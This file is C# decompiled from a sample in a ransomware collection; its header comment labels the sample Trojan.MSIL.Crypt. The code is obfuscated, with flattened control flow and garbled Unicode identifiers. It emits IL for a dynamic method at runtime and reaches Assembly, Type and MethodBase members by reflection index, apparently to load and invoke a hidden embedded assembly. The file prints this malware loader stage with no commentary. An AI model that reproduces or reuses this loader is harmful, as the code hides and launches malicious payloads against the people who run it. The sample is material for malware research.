// Decompiled with JetBrains decompiler
// Type: 蛼慡䤪䊔瘼⛗ఖ
// Assembly: SmartAssemblyReport, Version=0.5.0.0, Culture=neutral, PublicKeyToken=null
// MVID: FC88CA45-0F9B-4505-AD43-DCCBD3AE6C30
// Assembly location: C:\Users\Administrateur\Downloads\VirusShare_CryptoRansom_20160715-msil\Trojan.MSIL.Crypt.hao-e3c6800c58d985ae39bc4ee601c1701ff63705ea8a1a35a87e21ebfc30d96d37.exe

using System;
using System.Reflection;
using System.Reflection.Emit;

public class \uE323蛼慡䤪䊔瘼\u26D7ఖ
{
  public static Delegate 乱ＦK덜\uF8C4駴싖둿(Type _param0)
  {
label_0:
    DynamicMethod dynamicMethod = new DynamicMethod("clr", typeof (void), new Type[1]
    {
      typeof (byte[])
    }, true);
    int num = 14;
    MethodInfo meth;
    ILGenerator ilGenerator;
    Label label1;
    Label label2;
    Label label3;
    Label label4;
    while (true)
    {
      switch (num)
      {
        case 0:
          goto label_0;
        case 2:
          label1 = ilGenerator.DefineLabel();
          label2 = ilGenerator.DefineLabel();
          ilGenerator.Emit(OpCodes.Br_S, label3);
          num = 20;
          continue;
        case 3:
          meth = (MethodInfo) null;
          \uE323蛼慡䤪䊔瘼\u26D7ఖ.\uF7A9枃\uE36Cꎾ紞\uFFFDꔑ骭<Assembly>(39, out meth);
          ilGenerator.Emit(OpCodes.Call, meth);
          num = 1;
          continue;
        case 4:
          ilGenerator.Emit(OpCodes.Pop);
          num = 15;
          continue;
        case 5:
          ilGenerator.MarkLabel(label3);
          ilGenerator.Emit(OpCodes.Nop);
          num = 13;
          continue;
        case 6:
          label3 = ilGenerator.DefineLabel();
          num = 7;
          continue;
        case 7:
          label4 = ilGenerator.DefineLabel();
          num = 2;
          continue;
        case 8:
          ilGenerator.MarkLabel(label2);
          num = 12;
          continue;
        case 9:
          ilGenerator.Emit(OpCodes.Br_S, label2);
          num = 16;
          continue;
        case 10:
          ilGenerator.Emit(OpCodes.Ldnull);
          ilGenerator.Emit(OpCodes.Ldc_I4_0);
          ilGenerator.Emit(OpCodes.Newarr, typeof (object));
          num = 18;
          continue;
        case 11:
          ilGenerator.Emit(OpCodes.Callvirt, meth);
          ilGenerator.Emit(OpCodes.Ldc_I4_0);
          ilGenerator.Emit(OpCodes.Ldelem_Ref);
          \uE323蛼慡䤪䊔瘼\u26D7ఖ.\uF7A9枃\uE36Cꎾ紞\uFFFDꔑ骭<Type>(50, out meth);
          num = 17;
          continue;
        case 12:
          goto label_13;
        case 13:
          ilGenerator.Emit(OpCodes.Ldarg_0);
          num = 3;
          continue;
        case 14:
          ilGenerator = dynamicMethod.GetILGenerator();
          num = 6;
          continue;
        case 15:
          ilGenerator.Emit(OpCodes.Br_S, label4);
          ilGenerator.MarkLabel(label1);
          num = 9;
          continue;
        case 16:
          ilGenerator.MarkLabel(label4);
          ilGenerator.Emit(OpCodes.Br_S, label1);
          num = 8;
          continue;
        case 17:
          ilGenerator.Emit(OpCodes.Callvirt, meth);
          ilGenerator.Emit(OpCodes.Ldc_I4_0);
          ilGenerator.Emit(OpCodes.Ldelem_Ref);
          num = 10;
          continue;
        case 18:
          \uE323蛼慡䤪䊔瘼\u26D7ఖ.\uF7A9枃\uE36Cꎾ紞\uFFFDꔑ骭<MethodBase>(13, out meth);
          num = 19;
          continue;
        case 19:
          ilGenerator.Emit(OpCodes.Callvirt, meth);
          num = 4;
          continue;
        case 20:
          ilGenerator.Emit(OpCodes.Unaligned);
          ilGenerator.Emit(OpCodes.Volatile);
          ilGenerator.Emit(OpCodes.Cpblk);
          num = 5;
          continue;
        default:
          \uE323蛼慡䤪䊔瘼\u26D7ఖ.\uF7A9枃\uE36Cꎾ紞\uFFFDꔑ骭<Assembly>(16, out meth);
          num = 11;
          continue;
      }
    }
label_13:
    ilGenerator.Emit(OpCodes.Ret);
    return dynamicMethod.CreateDelegate(_param0);
  }

  private static void \uF7A9枃\uE36Cꎾ紞\uFFFDꔑ骭<T>(int _param0, out MethodInfo _param1) => _param1 = typeof (T).GetMethods()[_param0];

  public \uE323蛼慡䤪䊔瘼\u26D7ఖ()
  {
label_0:
    // ISSUE: explicit constructor call
    base.\u002Ector();
    switch (1)
    {
      case 0:
        goto label_0;
    }
  }
}
